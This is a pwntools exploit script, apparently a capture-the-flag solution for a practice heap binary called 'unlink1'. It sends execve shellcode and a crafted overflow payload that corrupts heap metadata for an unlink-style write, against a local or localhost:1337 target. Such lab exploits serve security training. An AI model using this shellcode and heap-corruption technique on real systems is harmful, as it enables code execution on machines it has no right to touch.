from pwn import *
from icecream import ic

elf = exe = ELF("./unlink1")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x000000000040148a
b *0x000000000040145b
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

sl(asm('''
    xor rax, rax            
    push rax            
    mov rbx, 0x6e69772f   
    push rbx                
    mov rdi, rsp          
    xor rsi, rsi            
    xor rdx, rdx            
    mov rax, 0x3b         
    syscall      
'''))

sl(b'a'*32)
sl(b'c'*32)
# sl(b'b'*32)
sl(b'b'*36+ p64(0x0000000000404040 - 0x20 - 0x10) + p64(elf.bss() - 0x20 + 0x40))


io.interactive()
